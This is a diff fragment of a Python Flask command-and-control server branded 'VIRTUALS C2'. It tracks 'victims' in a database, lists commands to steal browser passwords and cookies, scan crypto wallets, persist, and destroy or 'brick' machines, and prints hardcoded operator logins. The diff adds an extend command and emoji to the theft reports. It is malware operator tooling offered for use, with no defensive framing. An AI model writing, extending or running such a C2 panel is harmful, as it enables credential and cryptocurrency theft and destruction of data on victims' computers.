             c.execute("UPDATE victims SET browser_data_stolen = 1 WHERE id = ?", (vid,))
+        if is_extend and new_time:
+            c.execute("UPDATE victims SET fry_time = ? WHERE id = ?", (new_time, vid))
         c.execute("UPDATE users SET current_activity = 'idle' WHERE username = ?", (current_user,))
         conn.commit()
         conn.close()
         
         response = {'success': True, 'result': result}
+        if is_extend and new_time:
+            response['new_time'] = f"{new_time//3600}h {new_time%3600//60}m"
         if cmd == 'steal':
             response['browsers'] = 5
-            response['embed'] = {'title': 'Browser Data Stolen', 'content': '5 browsers | 700+ passwords | 2,000+ cookies\nDownload Users Browser Zip', 'color': '#88ccdd'}
+            response['embed'] = {'title': '🕵️ Browser Data Stolen', 'content': '5 browsers | 700+ passwords | 2,000+ cookies\nDownload Users Browser Zip', 'color': '#88ccdd'}
         if cmd == 'scan':
             response['wallets'] = [{'currency': k, 'balance': v['balance'], 'usd': v['usd']} for k, v in SAMPLE_WALLETS.items()]
-            response['embed'] = {'title': 'Wallet Scan', 'content': f'Found {len(SAMPLE_WALLETS)} wallets | Total: $578,124', 'color': '#ffd700'}
+            response['embed'] = {'title': '💰 Wallet Scan', 'content': f'Found {len(SAMPLE_WALLETS)} wallets | Total: $578,124', 'color': '#ffd700'}
         if cmd == 'whois':
-            response['embed'] = {'title': 'System Info', 'content': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro', 'color': '#44aaff'}
+            response['embed'] = {'title': '🖥️ System Info', 'content': 'PC: DESKTOP-ALPHA | IP: 192.168.1.10 | OS: Windows 10 Pro', 'color': '#44aaff'}
+        if cmd == 'status':
+            response['embed'] = {'title': '📊 Status', 'content': f'Victim: {vid}\nStatus: Online\nFry Time: {new_time//3600}h {new_time%3600//60}m' if new_time else 'Status retrieved', 'color': '#44dd88'}
         
         return jsonify(response)
     
@@ -878,17 +913,20 @@ def heartbeat():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
-    ║   VIRTUALS C2 - PERSISTENT VICTIMS                         ║
-    ║   Victims Never Disappear · Full Permissions               ║
-    ║   Jerry & Owner Can Chat · Others View Only               ║
+    ║   VIRTUALS C2 - ULTIMATE OPTIMIZED EDITION                 ║
+    ║   All Commands · EXTEND Support · Drag & Drop Upload       ║
+    ║   Browser Zip with History · Persistent Victims            ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
     print(f"[*] Server: http://localhost:{PORT}")
     print(f"[*] Login: http://localhost:{PORT}/login")
     print("\n[*] USERS:")
-    print("    adam    / virtuals2024 (viewer - can't chat)")
-    print("    jerry   / virtuals2024 (operator - CAN chat) ✨")
-    print("    haunt   / virtuals2024 (viewer - can't chat)")
-    print("    owner   / whiteknight (owner - CAN chat) 👑")
-    print("\n[*] Test victims are PERSISTENT and never disappear!")
+    print("    adam    / virtuals2024 (viewer)")
+    print("    jerry   / virtuals2024 (operator)")
+    print("    haunt   / virtuals2024 (viewer)")
+    print("    owner   / whiteknight (owner) 👑")
+    print("\n[*] COMMANDS:")
+    print("    whois, flash, screenshot, scan, persist, steal")
+    print("    upload, download, destroy, brick, vmcheck, oblivion")
+    print("    status, extend <minutes>")
     app.run(host='0.0.0.0', port=PORT, debug=False)
